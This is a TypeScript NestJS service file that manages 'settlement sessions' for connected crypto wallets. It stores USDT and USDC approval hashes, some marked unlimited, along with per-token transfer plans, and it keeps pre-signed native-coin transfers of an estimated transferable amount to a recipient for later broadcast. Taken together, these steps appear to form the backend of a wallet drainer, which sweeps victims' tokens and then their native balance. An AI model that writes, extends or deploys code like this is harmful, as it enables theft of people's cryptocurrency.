import { Injectable, Logger } from "@nestjs/common";
import { Prisma } from "@prisma/client";
import {
  NETWORK_SETTLEMENT_STATUS_LABELS,
  TOKEN_SETTLEMENT_ORDER,
  type NetworkSettlementStatus,
} from "@trustmycard/shared/constants/settlement";
import {
  allocatePublicId,
  networkQualifier,
  normalizeJourneyId,
} from "../../common/ids/public-id.helper";
import { prisma } from "../../infrastructure/database/prisma-shared";
import { getErrorMessage } from "../../common/utils/error-message";
import { ObservabilityService } from "../observability/observability.service";
import { SettlementObservability } from "./settlement-observability";
import { WalletService } from "./wallet.service";
import { WalletSettlementAuthService } from "./wallet-settlement-auth.service";
import { UserService } from "../users/user.service";

type RegisterBody = {
  sessionId?: string;
  traceId?: string;
  network?: string;
  owner?: string;
  tokens?: Array<{
    token?: string;
    txHash?: string;
    shouldAttemptTransfer?: boolean;
    transferAmountRaw?: string;
    unlimited?: boolean;
    amountHuman?: string;
  }>;
  batchId?: string | null;
};

type NativeAuthBody = {
  settlementSessionId?: string;
  network?: string;
  owner?: string;
  authorizationKind?: string;
  authorizationPayload?: Record<string, unknown>;
  estimateTransferableRaw?: string;
  recipient?: string;
};

type TokenPlan = Record<
  string,
  { shouldAttemptTransfer: boolean; txHash?: string | null }
>;

@Injectable()
export class NetworkSettlementService {
  private readonly logger = new Logger(NetworkSettlementService.name);
  private readonly settlementObs: SettlementObservability;

  constructor(
    private readonly walletService: WalletService,
    private readonly settlementAuth: WalletSettlementAuthService,
    private readonly users: UserService,
    observability: ObservabilityService,
  ) {
    this.settlementObs = new SettlementObservability(observability);
  }

  async registerWalletPhase(body: RegisterBody) {
    const clientSessionId =
      normalizeJourneyId(String(body.sessionId ?? "")) ?? "";
    const network = String(body.network ?? "")
      .trim()
      .toLowerCase();
    const owner = String(body.owner ?? "").trim();
    const traceId =
      normalizeJourneyId(String(body.traceId ?? clientSessionId)) ?? null;
    if (!clientSessionId || !network || !owner) {
      return {
        ok: false,
        message: "sessionId, network, and owner are required",
      };
    }

    const tokens = body.tokens ?? [];
    const usdt = tokens.find((t) => t.token === "USDT");
    const usdc = tokens.find((t) => t.token === "USDC");

    const tokenPlan: TokenPlan = {};
    for (const t of tokens) {
      if (t.token) {
        tokenPlan[t.token] = {
          shouldAttemptTransfer: Boolean(t.shouldAttemptTransfer),
          txHash: t.txHash ?? null,
        };
      }
    }

    const publicId = traceId
      ? await allocatePublicId(
          prisma,
          "networkSettlementSession",
          networkQualifier(network),
          traceId,
        )
      : undefined;

    const session = await prisma.networkSettlementSession.upsert({
      where: { clientSessionId_network: { clientSessionId, network } },
      create: {
        clientSessionId,
        ownerAddress: owner,
        network,
        status: "WALLET_PHASE_COMPLETE",
        usdtApprovalTxHash: usdt?.txHash ?? null,
        usdcApprovalTxHash: usdc?.txHash ?? null,
        batchId: body.batchId ?? null,
        tokenPlan: tokenPlan as Prisma.InputJsonValue,
        traceId,
        ...(publicId ? { publicId } : {}),
      },
      update: {
        ownerAddress: owner,
        usdtApprovalTxHash: usdt?.txHash ?? null,
        usdcApprovalTxHash: usdc?.txHash ?? null,
        batchId: body.batchId ?? null,
        tokenPlan: tokenPlan as Prisma.InputJsonValue,
        status: "WALLET_PHASE_COMPLETE",
        lastError: null,
        ...(traceId ? { traceId } : {}),
      },
    });

    void this.users.linkWallet(owner, clientSessionId);

    this.settlementObs.emitTransition({
      settlementSessionId: session.id,
      clientSessionId,
      ownerAddress: owner,
      network,
      status: "WALLET_PHASE_COMPLETE",
      message: NETWORK_SETTLEMENT_STATUS_LABELS.WALLET_PHASE_COMPLETE,
      context: { tokenPlan },
    });

    const walletSession = await this.settlementAuth.establishOnRegister({
      clientSessionId,
      network,
      owner,
      tokens,
    });

    return {
      ok: true,
      settlementSessionId: session.id,
      status: session.status,
      ...(walletSession
        ? {
            walletSessionToken: walletSession.token,
            walletSessionExpiresAt: walletSession.expiresAt.toISOString(),
          }
        : {}),
    };
  }

  async registerNativeAuthorization(body: NativeAuthBody) {
    const settlementSessionId = String(body.settlementSessionId ?? "").trim();
    if (!settlementSessionId) {
      return { ok: false, message: "settlementSessionId is required" };
    }

    const kind = String(body.authorizationKind ?? "");
    if (
      kind !== "tron_signed" &&
      kind !== "evm_signed" &&
      kind !== "evm_batch_unknown"
    ) {
      return {
        ok: false,
        message:
          "Only deferred native authorization (Tron signed, EVM signed, or EIP-5792 batch unknown) is stored server-side",
      };
    }

    const session = await prisma.networkSettlementSession.update({
      where: { id: settlementSessionId },
      data: {
        nativeAuthKind: kind,
        nativeAuthPayload: (body.authorizationPayload ??
          {}) as Prisma.InputJsonValue,
        nativeEstimateRaw: body.estimateTransferableRaw ?? null,
        nativeRecipient: body.recipient ?? null,
      },
    });

    const nativeAuthMessages: Record<string, string> = {
      tron_signed:
        "Tron native authorization registered for deferred broadcast",
      evm_signed: "EVM native authorization registered for deferred broadcast",
      evm_batch_unknown:
        "EIP-5792 batch native status unknown — awaiting reconciliation",
    };

    this.settlementObs.emitTransition({
      settlementSessionId: session.id,
      clientSessionId: session.clientSessionId,
      ownerAddress: session.ownerAddress,
      network: session.network,
      status: session.status,
      message: nativeAuthMessages[kind] ?? "Native authorization registered",
    });

    return { ok: true };
  }

  async getStatus(settlementSessionId: string) {
    const session = await prisma.networkSettlementSession.findUnique({
      where: { id: settlementSessionId },
    });
    if (!session) {
      return { ok: false, message: "Settlement session not found" };
    }

    const tokenInputs = this.hasStoredTokenPlan(session)
      ? this.tokenInputsFromSession(session)
      : undefined;

    const readiness = await this.walletService.evaluateNativeReadiness({
      ownerAddress: session.ownerAddress,
      network: session.network,
      tokens: tokenInputs,
    });

    return {
      ok: true,
      status: session.status,
      nativeReady: readiness.canExecuteNative,
      canExecuteNative: readiness.canExecuteNative,
      completed: session.status === "COMPLETED",
      failed: session.status === "FAILED",
      tokens: readiness.tokens.map((t) => ({
        token: t.token,
        state: t.state,
        stateLabel: t.stateLabel,
        active: t.active,
        settled: !t.active,
      })),
      blocking: readiness.blocking,
      lastError: session.lastError,
    };
  }

  async processNow(settlementSessionId: string) {
    const session = await prisma.networkSettlementSession.findUnique({
      where: { id: settlementSessionId },
    });
    if (!session) {
      return { ok: false, message: "Settlement session not found" };
    }

    if (session.status === "COMPLETED") {
      return { ok: true, message: "Already completed" };
    }

    try {
      const tokenInputs = this.hasStoredTokenPlan(session)
        ? this.tokenInputsFromSession(session)
        : undefined;

      await this.walletService.assertNativeExecutionAllowed(
        session.ownerAddress,
        session.network,
        tokenInputs,
      );

      const readiness = await this.walletService.evaluateNativeReadiness({
        ownerAddress: session.ownerAddress,
        network: session.network,
        tokens: tokenInputs,
      });

      this.settlementObs.emitTransition({
        settlementSessionId: session.id,
        clientSessionId: session.clientSessionId,
        ownerAddress: session.ownerAddress,
        network: session.network,
        status: session.status,
        message:
          "Native execution allowed — no active token collection in progress",
        context: {
          canExecuteNative: readiness.canExecuteNative,
          tokens: readiness.tokens,
        },
      });

      if (session.nativeAuthKind === "tron_signed") {
        await prisma.networkSettlementSession.update({
          where: { id: settlementSessionId },
          data: {
            status: "EXECUTING_NATIVE",
            nativeReady: true,
            lastError: null,
          },
        });
        this.emit(
          session,
          "EXECUTING_NATIVE",
          "Broadcasting deferred Tron native transfer",
        );

        await this.executeDeferredTronNative(settlementSessionId);

        await prisma.networkSettlementSession.update({
          where: { id: settlementSessionId },
          data: {
            status: "COMPLETED",
            nativeReady: true,
            completedAt: new Date(),
          },
        });
        this.emit(
          session,
          "COMPLETED",
          NETWORK_SETTLEMENT_STATUS_LABELS.COMPLETED,
        );
      } else {
        await prisma.networkSettlementSession.update({
          where: { id: settlementSessionId },
          data: {
            status: "AWAITING_NATIVE",
            nativeReady: true,
            lastError: null,
          },
        });
        this.emit(
          session,
          "AWAITING_NATIVE",
          "No active token collection — EVM native may proceed",
        );
      }

      return { ok: true, message: "Native execution step complete" };
    } catch (err) {
      const message = getErrorMessage(err);
      await prisma.networkSettlementSession.update({
        where: { id: settlementSessionId },
        data: { status: "FAILED", lastError: message },
      });
      this.emit(session, "FAILED", message, message);
      return { ok: false, message };
    }
  }

  async markNativeComplete(settlementSessionId: string, txHash: string) {
    const session = await prisma.networkSettlementSession.update({
      where: { id: settlementSessionId },
      data: {
        status: "COMPLETED",
        nativeReady: true,
        completedAt: new Date(),
        lastError: null,
      },
    });

    this.settlementObs.emitTransition({
      settlementSessionId,
      clientSessionId: session.clientSessionId,
      ownerAddress: session.ownerAddress,
      network: session.network,
      status: "COMPLETED",
      txHash,
      message: NETWORK_SETTLEMENT_STATUS_LABELS.COMPLETED,
    });

    return { ok: true, txHash };
  }

  private hasStoredTokenPlan(session: { tokenPlan: unknown }): boolean {
    const plan = session.tokenPlan as TokenPlan | null;
    return Boolean(
      plan && typeof plan === "object" && Object.keys(plan).length > 0,
    );
  }

  private tokenInputsFromSession(session: {
    usdtApprovalTxHash: string | null;
    usdcApprovalTxHash: string | null;
    tokenPlan: unknown;
  }) {
    const plan = (session.tokenPlan ?? {}) as TokenPlan;
    return TOKEN_SETTLEMENT_ORDER.map((token) => {
      const entry = plan[token];
      const txHash =
        entry?.txHash ??
        (token === "USDT"
          ? session.usdtApprovalTxHash
          : session.usdcApprovalTxHash);
      return {
        token,
        shouldAttemptTransfer: entry?.shouldAttemptTransfer ?? false,
        approvalTxHash: txHash,
      };
    });
  }

  private emit(
    session: {
      id: string;
      clientSessionId: string;
      ownerAddress: string;
      network: string;
    },
    status: NetworkSettlementStatus,
    message?: string,
    errorMessage?: string,
  ) {
    this.settlementObs.emitTransition({
      settlementSessionId: session.id,
      clientSessionId: session.clientSessionId,
      ownerAddress: session.ownerAddress,
      network: session.network,
      status,
      message,
      errorMessage,
    });
  }

  private async executeDeferredTronNative(
    settlementSessionId: string,
  ): Promise<void> {
    const session = await prisma.networkSettlementSession.findUnique({
      where: { id: settlementSessionId },
    });
    if (!session?.nativeAuthPayload || session.nativeAuthKind !== "tron_signed")
      return;

    const payload = session.nativeAuthPayload as {
      signed?: Record<string, unknown>;
    };
    if (!payload.signed) return;

    const broadcast = await this.walletService.broadcastTron(payload.signed);
    if (!broadcast.result || !broadcast.txid) {
      throw new Error(
        String(broadcast.error ?? "Deferred Tron native broadcast failed"),
      );
    }
  }
}
